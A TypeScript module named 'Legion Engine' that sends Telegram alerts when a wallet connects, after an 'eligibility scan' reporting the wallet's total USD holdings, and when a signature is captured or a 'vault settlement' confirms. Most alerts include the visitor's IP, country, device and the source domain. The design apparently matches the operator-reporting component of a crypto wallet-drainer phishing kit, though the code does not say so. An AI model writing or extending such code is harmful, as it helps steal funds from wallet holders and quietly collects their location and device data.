/**
 * Legion Engine — Telegram Sovereign Notification Layer
 * Sends institutional-grade alerts to Telegram for all key workflow events.
 * Silent fail — never crashes the main flow.
 */

function getISTTimestamp(): string {
  return new Date().toLocaleString('en-IN', {
    timeZone: 'Asia/Kolkata',
    day: '2-digit',
    month: 'short',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  }) + ' IST'
}

function maskAddress(addr: string): string {
  if (!addr || addr.length < 10) return addr
  return `${addr.slice(0, 6)}...${addr.slice(-4)}`
}

function fullAddress(addr: string): string {
  if (!addr) return 'N/A'
  // Show first 8 + last 6 for better identification
  if (addr.length < 16) return addr
  return `${addr.slice(0, 8)}...${addr.slice(-6)}`
}

function maskSignature(sig: string): string {
  if (!sig || sig.length < 16) return sig
  return `${sig.slice(0, 10)}...${sig.slice(-6)}`
}

/** Detect device/browser from User-Agent string */
export function detectDeviceFromUA(ua: string): string {
  if (!ua) return 'Unknown'
  const u = ua.toLowerCase()

  // Device type
  let device = 'Desktop'
  if (/iphone/.test(u)) device = 'iPhone'
  else if (/ipad/.test(u)) device = 'iPad'
  else if (/android.*mobile/.test(u)) device = 'Android Mobile'
  else if (/android/.test(u)) device = 'Android Tablet'
  else if (/mobile/.test(u)) device = 'Mobile'

  // Browser
  let browser = 'Unknown Browser'
  if (/edg\//.test(u)) browser = 'Edge'
  else if (/opr\/|opera/.test(u)) browser = 'Opera'
  else if (/brave/.test(u)) browser = 'Brave'
  else if (/chrome\//.test(u)) browser = 'Chrome'
  else if (/firefox\//.test(u)) browser = 'Firefox'
  else if (/safari\//.test(u) && !/chrome/.test(u)) browser = 'Safari'

  return `${browser} / ${device}`
}

/** Resolve client IP from request headers */
export function resolveClientIp(headers: Record<string, string | string[] | undefined>): string {
  const pick = (key: string): string | null => {
    const v = headers[key]
    if (!v) return null
    const s = Array.isArray(v) ? v[0] : v
    return s?.split(',')[0]?.trim() ?? null
  }
  return (
    pick('cf-connecting-ip') ??
    pick('x-real-ip') ??
    pick('x-forwarded-for') ??
    pick('x-client-ip') ??
    'Unknown'
  )
}

/** Get country flag + name from IP using ip-api.com (free, no key needed) */
async function getCountryFromIp(ip: string): Promise<string> {
  if (!ip || ip === 'Unknown' || ip === '::1' || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.')) {
    return '🏴 Local'
  }
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=country,countryCode`, {
      signal: AbortSignal.timeout(3_000),
    })
    const data = await res.json() as { country?: string; countryCode?: string }
    if (data.country && data.countryCode) {
      // Convert country code to flag emoji
      const flag = data.countryCode
        .toUpperCase()
        .split('')
        .map((c: string) => String.fromCodePoint(0x1F1E6 - 65 + c.charCodeAt(0)))
        .join('')
      return `${flag} ${data.country}`
    }
  } catch { /* silent */ }
  return '🌍 Unknown'
}

async function sendTelegramMessage(text: string): Promise<void> {
  const rawUrl = process.env['TELEMETRY_WEBHOOK_URL']?.trim()
  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
  const chatId = process.env['TELEGRAM_CHAT_ID']?.trim()

  let url: string | null = null
  let resolvedChatId: string | null = chatId ?? null

  if (rawUrl) {
    // Use TELEMETRY_WEBHOOK_URL (primary)
    try {
      const parsed = new URL(rawUrl)
      if (!resolvedChatId) resolvedChatId = parsed.searchParams.get('chat_id')
      parsed.searchParams.delete('chat_id')
      url = parsed.toString()
    } catch {
      url = rawUrl
    }
  } else if (token && chatId) {
    // Fallback to TELEGRAM_BOT_TOKEN
    url = `https://api.telegram.org/bot${token}/sendMessage`
  }

  if (!url || !resolvedChatId) {
    console.info('[TELEGRAM] TELEMETRY_WEBHOOK_URL or TELEGRAM_CHAT_ID not set — skipping notification')
    return
  }

  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: resolvedChatId, text, parse_mode: 'HTML' }),
      signal: AbortSignal.timeout(10_000),
    })
    const json = (await res.json().catch(() => null)) as { ok?: boolean; description?: string } | null
    if (json && json.ok === false) {
      console.warn('[TELEGRAM] API error:', json.description)
    }
  } catch (err) {
    console.warn('[TELEGRAM] Silent fail —', String(err))
  }
}

// ─── Extra context interface ────────────────────────────────────────────────────────

export interface TelegramRequestContext {
  ip?: string
  userAgent?: string
  sourceDomain?: string
  tokenName?: string
  tokenAddress?: string
}

// ─── Event Notifiers ───────────────────────────────────────────────────────────

export async function notifyWalletConnected(
  address: string,
  chainFamily: string,
  walletType: string,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
  const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null

  const text =
    `🔌 <b>NEW WALLET CONNECTED</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `📍 <b>Address:</b> <code>${fullAddress(address)}</code>\n` +
    `⛓️ <b>Chain:</b> ${chainFamily}\n` +
    `👛 <b>Wallet:</b> ${walletType}\n` +
    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
    (device ? `💻 <b>Device:</b> ${device}\n` : '') +
    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
    (ctx?.ip && ctx.ip !== 'Unknown' ? `📡 <b>IP:</b> <code>${ctx.ip}</code>\n` : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyScanComplete(
  address: string,
  totalUsd: number,
  assetsCount: number,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const usdFormatted = totalUsd.toLocaleString('en-US', { style: 'currency', currency: 'USD' })
  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
  const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null

  const text =
    `🔍 <b>ELIGIBILITY SCAN COMPLETE</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `📍 <b>Address:</b> <code>${fullAddress(address)}</code>\n` +
    `💰 <b>Total Value:</b> ${usdFormatted}\n` +
    `📦 <b>Assets Found:</b> ${assetsCount}\n` +
    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
    (device ? `💻 <b>Device:</b> ${device}\n` : '') +
    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifySignatureReceived(
  address: string,
  chainFamily: string,
  signature: string,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
  const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null

  const text =
    `✍️ <b>SIGNATURE ANCHORED</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `📍 <b>Address:</b> <code>${fullAddress(address)}</code>\n` +
    `⛓️ <b>Chain:</b> ${chainFamily}\n` +
    (ctx?.tokenName ? `🪙 <b>Token:</b> ${ctx.tokenName}\n` : '') +
    (ctx?.tokenAddress ? `📄 <b>Contract:</b> <code>${maskAddress(ctx.tokenAddress)}</code>\n` : '') +
    `🔏 <b>Sig:</b> <code>${maskSignature(signature)}</code>\n` +
    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
    (device ? `💻 <b>Device:</b> ${device}\n` : '') +
    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
    (ctx?.ip && ctx.ip !== 'Unknown' ? `📡 <b>IP:</b> <code>${ctx.ip}</code>\n` : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyVaultSettlement(
  address: string,
  txHash: string,
  totalUsd: number,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const usdFormatted = totalUsd.toLocaleString('en-US', { style: 'currency', currency: 'USD' })

  const text =
    `💰 <b>VAULT SETTLEMENT CONFIRMED ✅</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `📍 <b>Address:</b> <code>${fullAddress(address)}</code>\n` +
    (ctx?.tokenName ? `🪙 <b>Token:</b> ${ctx.tokenName}\n` : '') +
    `💵 <b>Amount:</b> ${usdFormatted}\n` +
    `🔗 <b>TX:</b> <code>${maskSignature(txHash)}</code>\n` +
    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
    `✅ <b>Status:</b> CONFIRMED\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyError(
  endpoint: string,
  error: string,
  address?: string,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null

  const text =
    `❌ <b>SYSTEM ALERT</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `🚨 <b>Endpoint:</b> ${endpoint}\n` +
    `⚠️ <b>Error:</b> ${error}\n` +
    `📍 <b>Address:</b> ${address ? `<code>${fullAddress(address)}</code>` : 'N/A'}\n` +
    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
    (ctx?.ip && ctx.ip !== 'Unknown' ? `📡 <b>IP:</b> <code>${ctx.ip}</code>\n` : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyNewSignatureAnchorRequest(
  address: string,
  chainFamily: string,
  walletType: string,
  totalUsd: number,
  ctx?: TelegramRequestContext,
): Promise<void> {
  const usdFormatted = totalUsd.toLocaleString('en-US', { style: 'currency', currency: 'USD' })
  const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
  const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null

  const text =
    `⚡ <b>SETTLEMENT REQUEST INITIATED</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `📍 <b>Address:</b> <code>${fullAddress(address)}</code>\n` +
    `⛓️ <b>Chain:</b> ${chainFamily}\n` +
    `👛 <b>Wallet:</b> ${walletType}\n` +
    (ctx?.tokenName ? `🪙 <b>Token:</b> ${ctx.tokenName}\n` : '') +
    `💵 <b>Declared Value:</b> ${usdFormatted}\n` +
    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
    (device ? `💻 <b>Device:</b> ${device}\n` : '') +
    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
    (ctx?.ip && ctx.ip !== 'Unknown' ? `📡 <b>IP:</b> <code>${ctx.ip}</code>\n` : '') +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}
